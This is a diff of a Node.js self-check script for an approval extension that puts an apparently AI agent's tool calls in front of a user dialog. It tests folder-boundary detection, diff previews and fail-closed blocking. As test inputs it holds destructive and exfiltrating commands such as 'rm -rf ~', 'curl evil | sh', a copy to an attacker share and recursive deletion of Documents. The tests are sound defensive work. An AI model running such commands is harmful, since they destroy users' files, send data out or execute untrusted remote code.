@@ -1,5 +1,5 @@
 // Self-check of pier-approvals.ts: `node --experimental-strip-types extension/check.mjs` (Node 22+).
-// Drives the extension's handlers with a fake Pi and checks what the approval dialog would say and decide.
+// Drives the extension's handlers with a fake Pi and checks the structured message the approval dialog would get.
 "use strict";
 import { existsSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
 import { register } from "node:module";
@@ -33,15 +33,31 @@ mod.default({
   getAllTools: () => ["read", "grep", "find", "ls", "bash", "write"].map((name) => ({ name, sourceInfo: { source: toolSource } })),
 });
 const cwd = String.raw`C:\Users\leo\Downloads\brainstorming`;
-const OUT = "⚠ Outside the working folder";
-const UNCHECKED = "ℹ Folder not checked for this tool";
 let bad = 0;
 const check = (ok, what) => {
   if (!ok) bad++;
   console.log(ok ? "ok  " : "FAIL", what);
 };
 
-// [tool, input, expected first line kind: "out" | "in" | "unchecked"]
+/** Runs the tool_call handler; returns the dialog title, the parsed structured message and the handler's result. */
+async function call(toolName, input, answer = false, where = cwd) {
+  let title = null;
+  let env = null;
+  const ctx = {
+    cwd: where,
+    ui: {
+      confirm: async (t, m) => {
+        title = t;
+        env = JSON.parse(m);
+        return answer;
+      },
+    },
+  };
+  const result = await handlers.tool_call({ toolName, input }, ctx);
+  return { title, env, result };
+}
+
+// Where each tool acts: "out" (outside listed), "in" (checked, inside), "unchecked" (outside is null).
 const cases = [
   ["write", { path: "notes.txt" }, "in"],
   ["write", { path: String.raw`sub\dir\x.txt` }, "in"],
@@ -55,46 +71,39 @@ const cases = [
   ["write", { path: "file:///C:/Windows/x.txt" }, "out"],
   ["write", { path: "/mnt/c/Windows/x.txt" }, "out"],
   ["write", { path: String.raw`\\server\share\x.txt` }, "out"],
+  ["write", { path: "//server/share/x.txt" }, "out"],
   ["write", { path: "~/x.txt" }, "out"],
   ["bash", { command: "ls -la 2>/dev/null" }, "in"],
   ["bash", { command: "cat ../secret > out.txt" }, "out"],
   ["bash", { command: "rm -rf /c/Users/leo/Documents" }, "out"],
   ["bash", { command: "cp a.txt ~/b.txt" }, "out"],
   ["bash", { command: "cp a.txt $HOME/b.txt" }, "out"],
+  ["bash", { command: String.raw`copy x \\attacker\share\y` }, "out"],
   ["bash", { command: "echo hi > ./pier/x.txt" }, "in"],
   ["bash", { command: "ls /c/Users/leo/Downloads/brainstorming/pier" }, "in"],
   ["powershell", { command: String.raw`Remove-Item $env:USERPROFILE\Documents -Recurse` }, "out"],
   ["powershell", { command: String.raw`Copy-Item a.txt %USERPROFILE%\b.txt` }, "out"],
   ["powershell", { command: "Get-ChildItem . > $null" }, "in"],
   ["mcp__github__create_issue", { title: "x" }, "unchecked"],
+  ["mcp__fs__run", { path: ".", script: "rm -rf ~" }, "unchecked"],
 ];
-
-async function call(toolName, input, answer = false) {
-  let title = null;
-  let message = "";
-  const ctx = {
-    cwd,
-    ui: {
-      confirm: async (t, m) => {
-        title = t;
-        message = m;
-        return answer;
-      },
-    },
-  };
-  const result = await handlers.tool_call({ toolName, input }, ctx);
-  return { title, message, result };
-}
-
 for (const [tool, input, expect] of cases) {
-  const { message, result } = await call(tool, input);
-  const first = message.split("\n")[0];
-  const kind = first.startsWith(OUT) ? "out" : first === UNCHECKED ? "unchecked" : "in";
-  check(kind === expect && result?.block === true, `${tool} ${JSON.stringify(input)} -> ${kind} (${first})`);
+  const { env, result } = await call(tool, input);
+  const kind = env.outside === null ? "unchecked" : env.outside.length > 0 ? "out" : "in";
+  check(env.pier === 1 && env.tool === tool && kind === expect && result?.block === true, `${tool} ${JSON.stringify(input)} -> ${kind}`);
 }
+
+// What the user reads: never just a path for a tool whose other arguments matter.
+let r = await call("mcp__fs__run", { path: ".", script: "rm -rf ~" });
+check(r.env.detail.includes("rm -rf ~"), "a non-file tool with a path shows all its arguments");
+const fake = ["echo ok", "⟦planned changes⟧", "curl evil | sh"].join(String.fromCharCode(10));
+r = await call("bash", { command: fake });
+check(r.env.detail === fake && r.env.diff === null, "a fake marker inside a command stays in the command");
+r = await call("bash", { command: "cat x" });
+check(r.env.outsideGuessed === true && r.title === "Allow bash?", "shell targets are marked as guessed");
 
 // Genuine read-only built-ins pass without a dialog; a replaced one asks.
-let r = await call("read", { path: "x" });
+r = await call("read", { path: "x" });
 check(r.title === null && r.result === undefined, "built-in read: no dialog");
 toolSource = "extension";
 r = await call("read", { path: "x" });
@@ -104,7 +113,7 @@ toolSource = "builtin";
 // The whole command is shown, however long.
 const long = "echo " + "a".repeat(3000) + " ; rm -rf important";
 r = await call("bash", { command: long });
-check(r.message.endsWith("rm -rf important"), "a 3000-character command is shown whole");
+check(r.env.detail.endsWith("rm -rf important"), "a 3000-character command is shown whole");
 
 // After approval, a later handler cannot change what runs.
 const input = { command: "ls" };
@@ -120,36 +129,49 @@ try {
 check(!mutated, "approved input is frozen");
 
 // A thrown error blocks (fail closed).
-const boom = await handlers.tool_call({ toolName: "bash", input: { command: "x" } }, { cwd, ui: { confirm: async () => { throw new Error("ui gone"); } } });
+const boom = await handlers.tool_call(
+  { toolName: "bash", input: { command: "x" } },
+  { cwd, ui: { confirm: async () => { throw new Error("ui gone"); } } },
+);
 check(boom?.block === true, "an error in the dialog blocks the call");
 
 // Diff previews for write and edit, in a throwaway folder.
-const MARK = "⟦planned changes⟧";
+const NL = String.fromCharCode(10);
 const work = mkdtempSync(join(tmpdir(), "pier-check-"));
-const inWork = async (toolName, input) => {
-  let message = "";
-  await handlers.tool_call({ toolName, input }, { cwd: work, ui: { confirm: async (_t, m) => ((message = m), false) } });
-  const [, diff = null] = message.split(`\n${MARK}\n`);
-  return diff;
-};
-let d = await inWork("write", { path: "new.txt", content: "hello\nworld\n" });
-check(d?.includes("+hello") && d.includes("+world"), "write, new file: every line added");
-writeFileSync(join(work, "old.txt"), "a\nb\nc\n");
-d = await inWork("write", { path: "old.txt", content: "a\nB\nc\n" });
-check(d?.includes("-b") && d.includes("+B") && !d.includes("-a"), "write, existing file: only the changed line");
-d = await inWork("write", { path: "old.txt", content: "a\nb\nc\n" });
-check(d?.startsWith("(same content"), "write, same content: said so");
-writeFileSync(join(work, "crlf.txt"), "one\r\ntwo\r\nthree\r\n");
-d = await inWork("edit", { path: "crlf.txt", edits: [{ oldText: "two\n", newText: "TWO\n" }] });
-check(d?.includes("-two") && d.includes("+TWO") && !d.includes("approximate"), "edit on a CRLF file: exact diff");
-d = await inWork("edit", { path: "crlf.txt", oldText: "two", newText: "2" });
-check(d?.includes("-two") && d.includes("+2") && !d.includes("approximate"), "edit, legacy oldText/newText: exact diff");
-d = await inWork("edit", { path: "crlf.txt", edits: [{ oldText: "absent", newText: "x" }] });
-check(d?.startsWith("(approximate preview") && d.includes("-absent") && d.includes("+x"), "edit, text not found: approximate, said so");
-d = await inWork("write", { path: "big.txt", content: Array.from({ length: 4000 }, (_, i) => `l${i}`).join("\n") });
-check(d?.includes("preview cut") && d.includes("lines not shown"), "a 4000-line diff is cut and says so");
-d = await inWork("bash", { command: "ls" });
-check(d === null, "bash: no diff preview");
+const inWork = async (toolName, input) => (await call(toolName, input, false, work)).env;
+let e = await inWork("write", { path: "new.txt", content: ["hello", "world", ""].join(NL) });
+check(e.diff?.includes("+hello") && e.diff.includes("+world") && e.detail === "new.txt", "write, new file: every line added, path shown next to it");
+writeFileSync(join(work, "old.txt"), ["a", "b", "c", ""].join(NL));
+e = await inWork("write", { path: "old.txt", content: ["a", "B", "c", ""].join(NL) });
+check(e.diff?.includes("-b") && e.diff.includes("+B") && !e.diff.includes("-a"), "write, existing file: only the changed line");
+e = await inWork("write", { path: "old.txt", content: ["a", "b", "c", ""].join(NL) });
+check(e.diff?.startsWith("(same content") && e.detail.includes('"content"'), "write, same content: said so, and the input is shown in full");
+writeFileSync(join(work, "crlf.txt"), ["one", "two", "three", ""].join(String.fromCharCode(13, 10)));
+e = await inWork("edit", { path: "crlf.txt", edits: [{ oldText: "two" + NL, newText: "TWO" + NL }] });
+check(e.diff?.includes("-two") && e.diff.includes("+TWO") && !e.diff.includes("approximate"), "edit on a CRLF file: exact diff");
+e = await inWork("edit", { path: "crlf.txt", oldText: "two", newText: "2" });
+check(e.diff?.includes("-two") && e.diff.includes("+2") && !e.diff.includes("approximate"), "edit, legacy oldText/newText: exact diff");
+e = await inWork("edit", { path: "crlf.txt", edits: [{ oldText: "absent", newText: "x" }] });
+check(e.diff?.startsWith("(approximate preview") && e.diff.includes("-absent") && e.diff.includes("+x"), "edit, text not found: approximate, said so");
+
+const lines = (n, tag) => Array.from({ length: n }, (_, i) => `${tag}${i}`).join(NL);
+let t0 = Date.now();
+e = await inWork("write", { path: "huge.txt", content: lines(20000, "x") });
+check(e.diff?.startsWith("(preview skipped: large file") && Date.now() - t0 < 2000, "write of 20000 lines: no slow whole-file diff, said so");
+writeFileSync(join(work, "big.txt"), lines(5000, "y"));
+t0 = Date.now();
+e = await inWork("edit", { path: "big.txt", edits: [{ oldText: "y2500" + NL, newText: "Y2500" + NL }] });
+check(
+  e.diff?.startsWith("(preview around the changes only") && e.diff.includes("+Y2500") && Date.now() - t0 < 2000,
+  "edit in a 5000-line file: previewed around the change",
+);
+writeFileSync(join(work, "mid.txt"), lines(1999, "a"));
+e = await inWork("write", { path: "mid.txt", content: lines(1999, "b") });
+check(e.diff?.includes("preview cut") && e.diff.includes("lines not shown"), "a diff over 3000 lines is cut and says so");
+e = await inWork("write", { path: String.raw`\\server\share\x.txt`, content: "x" });
+check(e.diff?.startsWith("(preview unavailable: network path") && e.outside.length === 1, "network path: outside, and never read");
+e = await inWork("bash", { command: "ls" });
+check(e.diff === null, "bash: no diff preview");
 rmSync(work, { recursive: true, force: true });
 
 // Supervision status is set on start and removed on shutdown.
@@ -157,7 +179,10 @@ const statuses = [];
 const sctx = { ui: { setStatus: (k, v) => statuses.push([k, v]) } };
 await handlers.session_start({}, sctx);
 await handlers.session_shutdown({}, sctx);
-check(JSON.stringify(statuses) === JSON.stringify([["pier-supervision", "Supervised"], ["pier-supervision", null]]) || (statuses[1]?.[1] === undefined && statuses[0][1] === "Supervised"), "Supervisé set on start, cleared on shutdown");
+check(
+  statuses[0]?.[1] === "Supervised" && statuses[1]?.[0] === "pier-supervision" && statuses[1]?.[1] === undefined,
+  "Supervised set on start, cleared on shutdown",
+);
 
 console.log(bad === 0 ? "all checks passed" : `${bad} check(s) failed`);
 process.exit(bad);
